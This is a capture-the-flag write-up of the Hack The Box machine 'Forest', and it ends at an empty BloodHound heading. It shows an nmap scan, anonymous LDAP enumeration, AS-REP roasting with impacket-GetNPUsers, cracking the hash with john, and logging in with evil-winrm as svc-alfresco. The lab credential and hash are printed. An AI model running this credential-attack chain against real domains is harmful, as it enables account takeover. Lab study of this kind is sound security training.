ME: 10.10.15.8
TARGET: 10.129.95.210

```
└─$ sudo nmap -sC -sV -p- -Pn 10.129.95.210 --max-retries 1
[sudo] password for xmen: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-11 19:14 -0400
Warning: 10.129.95.210 giving up on port because retransmission cap hit (1).
Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 60.87% done; ETC: 19:15 (0:00:05 remaining)
Nmap scan report for 10.129.95.210
Host is up (0.041s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE    SERVICE      VERSION
53/tcp    open     domain       Simple DNS Plus
88/tcp    open     kerberos-sec Microsoft Windows Kerberos (server time: 2026-07-11 16:24:29Z)
135/tcp   open     msrpc        Microsoft Windows RPC
139/tcp   open     netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open     ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
5539/tcp  filtered unknown
5985/tcp  open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf       .NET Message Framing
45081/tcp filtered unknown
47001/tcp open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open     msrpc        Microsoft Windows RPC
49665/tcp open     msrpc        Microsoft Windows RPC
49666/tcp open     msrpc        Microsoft Windows RPC
49667/tcp open     msrpc        Microsoft Windows RPC
49671/tcp open     msrpc        Microsoft Windows RPC
49680/tcp open     ncacn_http   Microsoft Windows RPC over HTTP 1.0
49681/tcp open     msrpc        Microsoft Windows RPC
49685/tcp open     msrpc        Microsoft Windows RPC
49700/tcp open     msrpc        Microsoft Windows RPC
64906/tcp filtered unknown
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: -4h30m44s, deviation: 4h02m32s, median: -6h50m46s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-07-11T09:25:25-07:00
| smb2-time: 
|   date: 2026-07-11T16:25:21
|_  start_date: 2026-07-11T16:21:59

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.47 seconds
```

# SMB

Cannot do an anonymous bind

# LDAP

Able to do ldapdomainsearch and dump a bunch of info anonymously. This points towards weak LDAP which maybe also could mean as-rep roasting. Used netexec to try to get any as-rep roastable accounts from the list of users I found by running ldapsearch.

Used impacket-GetNPUsers with -format john flag to get a crackable hash for any users with pre-auth disabled. Found and cracked a hash for svc-alfresco.

```
└─$ impacket-GetNPUsers -no-pass -usersfile users -dc-ip 10.129.95.210 HTB.LOCAL/ -format john 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$svc-alfresco@HTB.LOCAL:433ba09ef303a8f8abaad813f37109d9$dc0fb331393b26258d90abf687431212d49d3c4a896b235c48082ca91d9d6210e9dd64ffc740ba27131ce935b58a0ac1facc1db1d4ae63ef6bde8e4ced15cbdc7dd2a7f63dc94f71300d398d664f4ded7d872ec97a83e164478e85f5ec252aab8516f275f6cec543f6108c64a1e960d491f420166b1a692d7472ac3270b1933a60f1ea9cac808e1e00a8413221478d03e476058b0f886c0fb483885ca6c6bac1845c8fc1c5792957f683d14dc47b168d02d21d8a72507a78f8fe15e8ad89a6cfb9a0283d32c6cbbfb6e332a42a0b84d721f4ecd5c8fb91611516f4e3d459aa9d7c05753ed22e
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax

┌──(xmen㉿kali)-[~/forrest]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep hash                   
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:02 DONE (2026-07-11 20:21) 0.4273g/s 1746Kp/s 1746Kc/s 1746KC/s s521379846..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

This gives the credential svc-alfresco : s3rvice

Used this to test SMB again and able to authenticate. However, there wasn't much to see.

Ran bloodhound-python collector using this user and it worked. Also able to evil-winrm in using the same credentials. This let me get the user flag.

# Bloodhound

